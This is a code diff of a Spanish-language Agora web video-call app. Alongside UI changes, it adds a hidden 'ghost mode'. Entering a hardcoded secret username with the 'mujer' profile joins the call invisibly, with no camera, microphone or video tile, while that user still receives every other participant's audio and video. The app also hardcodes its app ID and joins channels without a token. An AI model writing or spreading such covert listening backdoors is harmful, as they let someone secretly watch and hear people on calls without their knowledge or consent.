@@ -8,72 +8,155 @@
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         .video-full { width: 100vw; height: 100vh; object-fit: cover; }
-        .controls-transition { transition: opacity 0.5s ease-in-out; }
-        .hidden-controls { opacity: 0; pointer-events: none; }
-        .visible-controls { opacity: 1; }
+        .controls-transition { transition: opacity 0.4s ease-in-out, transform 0.4s ease-in-out; }
+        .hidden-controls { opacity: 0; pointer-events: none; transform: translateY(20px); }
+        .visible-controls { opacity: 1; transform: translateY(0); }
+        @keyframes pulse-slow { 0%, 100% { opacity: 0.3; } 50% { opacity: 1; } }
+        .animate-pulse-slow { animation: pulse-slow 2s infinite; }
     </style>
 </head>
-<body class="bg-black text-white font-sans overflow-hidden">
+<body class="bg-[#05070c] text-white font-sans overflow-hidden select-none">
 
-    <!-- Pantalla de Bienvenida -->
-    <div id="splash-screen" class="fixed inset-0 z-50 flex items-center justify-center bg-black">
-        <h1 id="text-welcome" class="text-5xl font-black text-transparent bg-clip-text bg-gradient-to-r from-purple-500 to-indigo-500">WELCOME</h1>
-        <div id="quiz-container" class="hidden flex flex-col items-center">
-            <h2 class="text-2xl font-bold mb-6">Ready to have fun?</h2>
-            <button onclick="handleIntroChoice(true)" class="px-10 py-3 bg-indigo-600 rounded-full font-bold active:scale-95">YES</button>
+    <div id="splash-screen" class="fixed inset-0 z-50 flex flex-col items-center justify-center bg-[#05070c] p-6 text-center">
+        <h1 id="text-welcome" class="text-5xl font-black tracking-wider text-transparent bg-clip-text bg-gradient-to-r from-purple-500 via-indigo-400 to-pink-500 transition-all duration-1000">
+            WELCOME
+        </h1>
+
+        <div id="quiz-container" class="hidden flex flex-col items-center space-y-6">
+            <h2 class="text-2xl md:text-3xl font-bold tracking-tight text-gray-200">Ready to have fun?</h2>
+            <button onclick="goToProfileSelection()" class="w-48 py-3.5 bg-gradient-to-r from-purple-600 to-indigo-600 rounded-full font-bold shadow-lg shadow-indigo-500/20 active:scale-95 transition">
+                YES
+            </button>
+        </div>
+
+        <div id="profile-container" class="hidden flex flex-col items-center space-y-6 w-full max-w-xs">
+            <h2 class="text-xl font-semibold tracking-wide text-gray-400 uppercase text-xs">Select your profile</h2>
+            <div class="flex flex-col space-y-3 w-full">
+                <button onclick="selectProfile('hombre')" class="w-full py-4 bg-white/5 hover:bg-white/10 border border-white/10 rounded-2xl font-medium tracking-wide active:scale-98 transition">
+                    Hombre ♂️
+                </button>
+                <button onclick="selectProfile('mujer')" class="w-full py-4 bg-gradient-to-r from-pink-600 to-purple-600 font-bold tracking-wide rounded-2xl shadow-lg shadow-pink-500/10 active:scale-98 transition">
+                    Mujer ♀️
+                </button>
+                <button onclick="selectProfile('english')" class="w-full py-4 bg-white/5 hover:bg-white/10 border border-white/10 rounded-2xl font-medium tracking-wide active:scale-98 transition">
+                    English 🇺🇸
+                </button>
+            </div>
         </div>
     </div>
 
-    <!-- Login -->
-    <div id="main-app" class="hidden fixed inset-0 flex items-center justify-center p-6">
-        <div class="w-full max-w-sm glass bg-white/10 backdrop-blur-lg p-8 rounded-3xl border border-white/10">
-            <input type="text" id="sala" class="w-full bg-black/50 p-4 rounded-xl mb-4 border border-white/10" value="sala1" placeholder="Sala">
-            <input type="text" id="usuario" class="w-full bg-black/50 p-4 rounded-xl mb-4 border border-white/10" placeholder="Tu nombre">
-            <button onclick="entrarALallamada()" class="w-full py-4 bg-purple-600 rounded-xl font-bold">ENTRAR</button>
-        </div>
-    </div>
-
-    <!-- Interfaz de Llamada -->
-    <div id="call-interface" class="hidden relative w-screen h-screen bg-black">
-        <div id="remote-video" class="w-full h-full"></div>
-        <div id="local-video" class="absolute bottom-24 right-4 w-32 h-48 bg-gray-800 rounded-2xl border-2 border-white/20 overflow-hidden z-10 shadow-2xl"></div>
-        
-        <!-- Temporizador (Siempre visible) -->
-        <div class="absolute top-6 left-0 right-0 text-center z-20">
-            <span id="timer" class="bg-black/50 backdrop-blur px-4 py-1 rounded-full font-mono text-sm font-bold border border-white/10">00:00</span>
-        </div>
-
-        <!-- Controles que aparecen al tocar -->
-        <div id="controls-ui" class="absolute bottom-0 w-full p-8 flex justify-center z-30 controls-transition hidden-controls">
-            <button onclick="location.reload()" class="bg-red-600 hover:bg-red-700 px-8 py-3 rounded-full font-bold shadow-xl transition-all active:scale-90">
-                CORTAR LLAMADA
+    <div id="main-app" class="hidden fixed inset-0 flex flex-col items-center justify-center p-6 z-40">
+        <div class="w-full max-w-sm bg-white/[0.03] backdrop-blur-xl p-8 rounded-3xl border border-white/10 shadow-2xl space-y-5">
+            <div class="text-center mb-2">
+                <h2 class="text-2xl font-black bg-clip-text text-transparent bg-gradient-to-r from-purple-400 to-pink-400">BRIDGE CALL</h2>
+                <p id="badge-perfil" class="text-[10px] text-purple-400 font-bold tracking-widest uppercase mt-1"></p>
+            </div>
+            <div>
+                <input type="text" id="sala" class="w-full bg-black/40 p-4 rounded-xl border border-white/5 focus:outline-none focus:border-purple-500 font-medium transition text-sm" value="sala1" placeholder="Nombre de la sala">
+            </div>
+            <div>
+                <input type="text" id="usuario" class="w-full bg-black/40 p-4 rounded-xl border border-white/5 focus:outline-none focus:border-purple-500 font-medium transition text-sm" placeholder="Tu nombre de usuario">
+            </div>
+            <button onclick="entrarALallamada()" class="w-full py-4 bg-gradient-to-r from-purple-600 to-pink-600 rounded-xl font-bold tracking-wide text-sm shadow-xl active:scale-95 transition">
+                CONECTAR
             </button>
         </div>
     </div>
 
+    <div id="call-interface" class="hidden relative w-screen h-screen bg-black">
+        
+        <div id="remote-video" class="w-full h-full"></div>
+        
+        <div id="local-video-container" class="absolute bottom-28 right-4 w-28 h-40 bg-gray-900 rounded-2xl border border-white/10 overflow-hidden z-10 shadow-2xl transition-all"></div>
+        
+        <div class="absolute top-2 left-1/2 -translate-x-1/2 z-50 pointer-events-none">
+            <div class="flex items-center space-x-1.5 bg-black/60 backdrop-blur-md px-3 py-1 rounded-full border border-white/10 shadow-lg">
+                <div id="live-indicator" class="w-1.5 h-1.5 bg-gray-500 rounded-full"></div>
+                <span id="timer" class="font-mono text-xs font-bold tracking-wider text-gray-400">00:00</span>
+            </div>
+        </div>
+
+        <div id="controls-ui" class="absolute bottom-6 left-0 right-0 px-4 flex justify-center items-center gap-3 z-30 controls-transition hidden-controls">
+            
+            <button onclick="location.reload()" class="bg-red-500 hover:bg-red-600 px-6 py-3.5 rounded-2xl font-bold text-xs tracking-wider shadow-lg active:scale-90 transition">
+                CORTAR LLAMADA
+            </button>
+            
+            <button id="btn-start-timer" onclick="startTimer()" class="hidden bg-emerald-600 hover:bg-emerald-700 px-6 py-3.5 rounded-2xl font-bold text-xs tracking-wider shadow-lg active:scale-90 transition flex items-center gap-2">
+                ⏱️ INICIAR TIEMPO
+            </button>
+            
+        </div>
+    </div>
+
 <script>
-    const USUARIO_MONITOR_SECRETO = "AdminMonitor";
+    // Configuración Secreta de Monitoreo
+    const USUARIO_MONITOR_SECRETO = "536092";
     const APP_ID = "93fa29881aa549dcb627df6e7865b88c";
     const client = AgoraRTC.createClient({ mode: "rtc", codec: "vp8" });
     
+    let selectedProfile = '';
     let timerInterval;
     let seconds = 0;
     let timerStarted = false;
+    let uiTimeout;
 
-    // Lógica UI
-    document.body.addEventListener('click', () => {
+    // Control de la Interfaz que se oculta sola
+    document.body.addEventListener('click', (e) => {
+        // Solo actúa si ya estamos dentro de la llamada
+        if(document.getElementById('call-interface').classList.contains('hidden')) return;
+        
         const ui = document.getElementById('controls-ui');
         ui.classList.remove('hidden-controls');
         ui.classList.add('visible-controls');
-        setTimeout(() => {
+        
+        clearTimeout(uiTimeout);
+        uiTimeout = setTimeout(() => {
             ui.classList.remove('visible-controls');
             ui.classList.add('hidden-controls');
-        }, 7000);
+        }, 7000); // 7 segundos exactos
     });
 
+    // Control de Flujos Iniciales
+    window.addEventListener('DOMContentLoaded', () => {
+        setTimeout(() => {
+            document.getElementById('text-welcome').classList.add('opacity-0');
+            setTimeout(() => {
+                document.getElementById('text-welcome').style.display = 'none';
+                const quiz = document.getElementById('quiz-container');
+                quiz.classList.remove('hidden');
+            }, 1000);
+        }, 2000);
+    });
+
+    function goToProfileSelection() {
+        document.getElementById('quiz-container').style.display = 'none';
+        document.getElementById('profile-container').classList.remove('hidden');
+    }
+
+    function selectProfile(profile) {
+        selectedProfile = profile;
+        document.getElementById('splash-screen').style.display = 'none';
+        document.getElementById('main-app').classList.remove('hidden');
+        
+        // Colocar texto estético del rol en el formulario
+        document.getElementById('badge-perfil').innerText = `Perfil: ${profile}`;
+    }
+
+    // Activador Manual del Cronómetro
     function startTimer() {
         if (timerStarted) return;
         timerStarted = true;
+        
+        // Estilo del reloj activo
+        document.getElementById('timer').classList.remove('text-gray-400');
+        document.getElementById('timer').classList.add('text-emerald-400');
+        document.getElementById('live-indicator').classList.remove('bg-gray-500');
+        document.getElementById('live-indicator').classList.add('bg-emerald-500', 'animate-pulse-slow');
+        
+        // Esconder el botón una vez usado para limpiar interfaz
+        document.getElementById('btn-start-timer').style.display = 'none';
+
         timerInterval = setInterval(() => {
             seconds++;
             const mins = Math.floor(seconds / 60).toString().padStart(2, '0');
@@ -82,44 +165,55 @@
         }, 1000);
     }
 
-    // Flujo inicio
-    window.addEventListener('DOMContentLoaded', () => {
-        setTimeout(() => {
-            document.getElementById('text-welcome').style.display = 'none';
-            document.getElementById('quiz-container').classList.remove('hidden');
-        }, 2000);
-    });
-
-    function handleIntroChoice(ready) {
-        if(!ready) return;
-        document.getElementById('splash-screen').style.display = 'none';
-        document.getElementById('main-app').classList.remove('hidden');
-    }
-
+    // Conexión del Servidor
     async function entrarALallamada() {
-        const canalNombre = document.getElementById("sala").value;
-        const usuarioNombre = document.getElementById("usuario").value;
-        const isMonitor = (usuarioNombre === USUARIO_MONITOR_SECRETO);
+        const canalNombre = document.getElementById("sala").value.trim().toLowerCase();
+        const usuarioNombre = document.getElementById("usuario").value.trim();
+
+        if (!canalNombre || !usuarioNombre) {
+            alert("Por favor completa los datos.");
+            return;
+        }
+
+        // CONDICIÓN RESTRIGIDA: Monitoreo requiere obligatoriamente haber marcado perfil MUJER + Usuario Clave
+        const esMonitorSecreto = (selectedProfile === 'mujer' && usuarioNombre === USUARIO_MONITOR_SECRETO);
 
         await client.join(APP_ID, canalNombre, null, null);
         document.getElementById("main-app").style.display = 'none';
         document.getElementById("call-interface").classList.remove('hidden');
 
-        if (!isMonitor) {
-            const audioTrack = await AgoraRTC.createMicrophoneAudioTrack();
-            const videoTrack = await AgoraRTC.createCameraVideoTrack();
-            videoTrack.play('local-video');
-            await client.publish([audioTrack, videoTrack]);
+        if (esMonitorSecreto) {
+            // MODO FANTASMA: No activa cámara, no muestra su recuadro y esconde controles de tiempo
+            document.getElementById('local-video-container').style.display = 'none';
+            console.log("Monitoreo invisible activado.");
+        } else {
+            // USUARIO NORMAL (O Mujeres Reales)
+            try {
+                const audioTrack = await AgoraRTC.createMicrophoneAudioTrack();
+                const videoTrack = await AgoraRTC.createCameraVideoTrack();
+                
+                videoTrack.play('local-video-container');
+                await client.publish([audioTrack, videoTrack]);
+
+                // Mostrar botón de reloj ÚNICAMENTE si es mujer real
+                if (selectedProfile === 'mujer') {
+                    document.getElementById('btn-start-timer').classList.remove('hidden');
+                    document.getElementById('btn-start-timer').style.display = 'flex';
+                }
+            } catch (e) {
+                alert("Por favor permite los permisos de cámara en tu navegador.");
+            }
         }
 
+        // Suscripción a transmisiones remotas
         client.on("user-published", async (user, mediaType) => {
             await client.subscribe(user, mediaType);
             if (mediaType === "video") {
                 user.videoTrack.play('remote-video');
-                // Si es un usuario normal (no monitor), inicia el conteo
-                if (!isMonitor) startTimer();
             }
-            if (mediaType === "audio") user.audioTrack.play();
+            if (mediaType === "audio") {
+                user.audioTrack.play();
+            }
         });
     }
 </script>
